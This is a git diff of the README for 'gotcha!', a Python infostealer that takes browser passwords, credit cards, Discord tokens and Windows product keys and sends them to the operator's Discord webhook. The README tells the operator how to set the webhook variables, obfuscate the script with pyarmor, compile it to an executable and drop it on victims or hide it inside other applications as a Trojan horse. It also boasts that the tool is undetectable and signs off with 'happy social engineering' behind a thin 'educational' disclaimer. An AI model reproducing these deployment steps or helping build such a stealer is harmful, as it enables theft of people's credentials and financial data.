@@ -1,16 +1,16 @@
 ![](https://img.shields.io/badge/version-1.0-lightgrey.svg)
-  <h3 align="center">gotcha! | password & discord token retrieval</h3>
+  <h3 align="center">gotcha! | password & discord token retrieval/stealer</h3>
   <p align="center">
-    victim's passwords & discord token > all data sent to your Discord webhook of choice.
+    steal victim's passwords & discord token > all collected data sent to your Discord webhook of choice.
   
 ---------------------------------------------------
->> utilizes discord's webhooks > sends passwords in a .zip, and token in chat
+>> utilizes Discord's webhooks > sends passwords in a .zip, token, and windows product key in chat.
 
 >> supports majority of chromium based browsers, is definitely open to improvement : (if you know how to do so, open a pull request with your code!)
 
 >> basically : 100% FUD 
 
->> steals : credit cards, passwords, windows product key, & Discord token
+>> steals : Discord Token, Browser Passwords, Windows Product Key, Credit-cards, etc.
 
 >> expert programmers: i give you permission to re-write this : if you can make everything be sent in one single, neat embed. 👍
 
@@ -22,19 +22,27 @@
 * [PYTHON]
 
 ### INSTRUCTIONS :
->> my webhook feature is slightly unusual, however it's easy to understand :
+the way i've setup my webhook is an interesting system, but it's fairly easy to understand:
 
->> you'll want to find : "whID" & "whAT" : ID = Webhook ID, AT = Webhook Authorization Token 
+"whID" = Webhook ID
 
->> highlighted are these two variables: https//discordcom/api/webhooks/**00000000**/**qwertyuiop**
+"whAT" = Webhook Token/Authorization Token
 
->> simply find these in your webhook, and replace the variables with your data : script fully built.
+these are the two most important variables in the script, in-fact they're the only ones you'll have to configure.
 
->> you'll either want to pack the script with pyarmor, & then exe it > or .exe it, either one.
+example: https//discordcom/api/webhooks/**00000000**/**qwertyuiop**
 
->> drop to victim, and wait for them to run : the script is ideal to be placed into other applications, much like a "Trojan Horse" .
+the variables are highlighted, those are the one's youll want to find in your own webhook.
 
->> happy social engineering ! disclaimer: educational purposed
+once you've found those variables, carefully remove "webhook-id" & "webhook-token" & replace them with your own,
+
+once that's complete > the script is fully built! 
+
+you'll either want to pack the script with pyarmor, & then exe it > or .exe it, either one.
+
+drop to victim, and wait for them to run : the script is ideal to be placed into other applications, much like a "Trojan Horse" .
+
+happy social engineering ! disclaimer: educational purposed
 
 ### PY > EXE :
 
@@ -50,4 +58,4 @@ if you're having any issues, feel free to look at my main page and find my curre
 
 <> extra <>
 
-discord, passwords, browsersteal, credit cards, webhooks, python, chrome password stealer, browser password stealer, microsoft edge password stealer, credit card stealer, discord webhooks, windows key, windows product key, stealer
+Passwords Stealer, Passwords Extraction, Discord Passwords, Passwords Steal, Chrome Stealer, Credit Cards Stealer, Discord Webhook Stealer, Windows Product Key Stealer, Browser Steal, Password Steal, Steal All Passwords, Bank Steal, Discord Stealer, Python, Discord Passwords Steal
